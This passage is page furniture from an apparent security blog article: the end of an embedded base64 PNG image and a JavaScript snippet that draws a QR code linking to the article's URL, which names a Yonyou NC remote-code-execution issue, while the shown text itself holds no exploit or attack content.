6nwWkRp84vdB95qHr1kN06Gj+GTwM5Jmi2/P3buCPBwJ5GlZPDyR/9RLgOZ/72E9eODXoPSG8vBUQDh1nHznEV7UV6rXex9QnX/HS/3gg1eSO/+8GfmwgkKcNgvsn7GwN8c2XDtGBmXrYZyaA9+//Z14OyUPQevPyidD90Pn0y+1b+GMD8TA39hs4DKSmdBa97IPphTwNVxzi++jQV9DzEG5f3ZOXrgapgY7my1sBydd6H1c+SB10tMesVxchdfI9HgayT97r77+BbSCQqcHneHVESP30+dSI5p/lkL7Q0T6FkFytK+wtllZxxctzFtD767GfqD4Rej2EwwduA5nFN/+ZG7gH8jP3vtz1PwAAAP//lu43UQAAAAZJREFUAwDGnP6/wKz5DgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-UserSynchronizationServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 